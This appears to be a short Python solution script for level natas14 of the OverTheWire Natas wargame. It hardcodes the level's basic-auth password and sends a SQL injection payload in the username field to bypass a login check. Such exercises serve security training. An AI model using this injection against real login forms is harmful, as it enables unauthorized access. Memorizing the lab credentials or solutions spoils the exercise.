import requests

username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'
url = "http://{}.natas.labs.overthewire.org/".format(username)

data = {
    'username': 'a" or "1"="1',
    'password': '1234565'
}

r = requests.post(url,data=data, auth=(username, password))

print(r.text)
